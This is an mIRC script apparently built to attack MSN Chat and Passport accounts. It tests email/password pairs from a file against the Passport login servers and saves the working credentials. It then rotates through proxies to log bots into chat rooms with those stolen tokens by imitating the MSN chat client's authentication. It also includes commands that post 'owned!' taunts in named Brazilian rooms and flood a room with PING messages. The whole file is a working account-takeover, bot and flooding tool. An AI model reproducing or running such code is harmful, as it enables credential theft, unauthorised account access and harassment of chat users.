; servers: 207.68.167 .161 brasil amizade 2k .159 eu qro + .157 jovens de cristo

alias h var %i 1, %r | while ($asc($mid($1,%i))) { %r = $+(%r,%,$base($v1,10,16)) | inc %i } | return %r
alias u sockclose u | o $+($iif(*@msn.* iswm $1,msnia),login,$iif(*@hotmail.* iswm $1,net),.passport.com) $h($1) $h($2)
alias o sockopen u $1 80 | sockmark u OrgVerb=GET,OrgURL=?,sign-in= $+ $2 $+ ,pwd= $+ $3 $+ ,id=507 $+ $crlf $+ Host: $1
on *:sockopen:u: sockwrite u $+(GET /login2.srf HTTP/1.1,$crlf,Authorization: Passport1.4,$sock(u).mark,$crlf,$crlf)
on *:sockread:u: var %x | sockread %x | echo $x | if (a* iswm %x) set %a $replace($left($token(%x,7-8,61),-4),&p=,~)
on *:sockclose:u: if (%a) n %a | else { echo 4 error: $read(pass.txt,%n) | g } | unset %a
alias n write auth.txt %a | g
alias g echo 14 * $calc($ticks - %t) msecs @ $token($read(pass.txt,%n),1,32) | gh
alias gh inc %n | unset %a | set %t $ticks | u $$read(pass.txt,%n)
alias c write -c auth.txt | set %n 0 | gh

alias xx sockclose *

alias prox return $replace($read(proxy.txt,%p),:,$chr(32))
alias nd dll nHTMLn_2.95.dll $1-
alias oc sockclose o* | nd navigate about:blank
alias oi sockclose o* | socklisten otl 2 | window -h @o | var %h $window(@o).hwnd | nd select %h $nd(attach,%h)
alias on nd navigate about:<object classid=clsid:eccdba05-b58f-4509-ae26-cf47b2ffc3fe><param name=nickname value=x><param name=server value=207.68.167.161:2></object>
on *:socklisten:otl: sockaccept ot
on *:sockread:ot: var %x | sockread %x | ; echo -a %x | pr %x
alias sw if ($sock(m).status == active) s $1- | elseif ($sock(m)) .timer -m 1 50 sw $1-
alias s sockwrite -n m $1- | echo 15 -a m: $1-
alias m sockclose m | set %n xxxx_ $+ $ticks | sockopen m $prox | oi
alias a var %x $gettok($read(auth.txt,$2),$1,126) | return $base($len(%x),10,16,8)) $+ %x
alias ne {
  set %t $ticks | inc %l
  if ($read(auth.txt,%l)) { m | if (2 // %l) inc %p | if (%p > $lines(proxy.txt)) { echo 4 proxy end | set %p 1 } }
  else set %e 1
}
alias st sockclose * | set %l 1 | set %e 0 | set %p 1 | m
on *:sockopen:m: if ($sockerr) { echo 4 failed %p $read(proxy.txt,%p) | inc %p | m } | else s $+(CONNECT 207.68.167.161:6667 HTTP/1.0,$crlf,$crlf)
on *:sockread:m: {
  var %x | sockread %x | echo -a m: %x
  if (http/* iswm %x) { s NICK %n $crlf IRCVERS IRC8 MSN-OCX!8.00.0211.1802 | on }
  if (auth * :ok iswm %x) s auth gatekeeperpassport S $+(:,$a(1,%l),$a(2,%l),$lf,user %n * * :x) $oc
  if (a* iswm %x) && ($sock(ot)) sockwrite -n ot %x
  if (a* 0 iswm %x) { sockrename m z $+ $ticks | echo 2 -a * %n ok in $calc($ticks - %t) | ne }
}
alias z sockwrite -n z* $1- | echo 15 -a z: $1-
on *:sockread:z*: var %x | sockread %x | if (%e) echo -a %x | if (ping* iswm %x) sockwrite -n $sockname $replace(%x,ping,pong)
alias bot sockwrite -n $sock(z*) WHO $(%#Jovens\bde\bcristo,0)
alias ajx z JOIN $(%#Jovens\bde\bcristo,0) $lf PRIVMSG $(%#Jovens\bde\bcristo,0) :owned! hahah.. (ajx rlz) $lf PART $(%#Jovens\bde\bcristo,0)
alias jt sockwrite -n * join $tmp(room) $+ $str($+($lf,privmsg $tmp(room) :TIME,$lf,privmsg $tmp(room) :PING 12),$iif($1,$1,3)) $+ $lf $+ part $tmp(room)
alias tmp return $(%#Amizade_2000_,0)
alias pr $iif(i == $3,sw,s) $1 GateKeeperPassport $3 $iif(i == $3,$4-,$unhex($escap($left($unescap($tohex($4)),-32) $+ $gen ))) | if (s == $3) echo -a $right($unescap($tohex($4)),32)
alias gen {
  return $read(auth2.txt)
  var %i 16, %r | while (%i) { %r = %r $+ $base($r(1,255),10,16,2) | dec %i } | echo 3 %r | return %r
}
alias tohex { var %l 1, %r | while (%l <= $len($1-)) { %r = %r $+ $base($asc($mid($1-,%l,1)),10,16,2) | inc %l 1 } | return %r }
alias unhex { var %l 1, %r, %c | while (%l <= $len($1-)) { %c = $chr($base($mid($1-,%l,2),16,10)) | %r = $iif(%c == $chr(32),%r %c,%r $+ %c) | inc %l 2 } | return %r }
alias escap {
  var %i 1, %r, %l $len($1-), %o
  while (%i < %l) { %r = %r $+ $replace($mid($1-,%i,2),5C,5C5C,00,5C30,20,5C62,2C,5C63,10,5C6E,13,5C72,09,5C74) | inc %i 2 }
  return %r
}
alias unescap {
  var %i 1, %r, %l $len($1-), %o
  while (%i < %l) {
    %o = $mid($1-,%i,2)
    if (%o != 5C) %r = %r $+ %o
    else { inc %i 2 | %r = %r $+ $replace($mid($1-,%i,2),30,00,62,20,63,2C,6E,10,72,13,74,09) }
    inc %i 2
  }
  return %r
}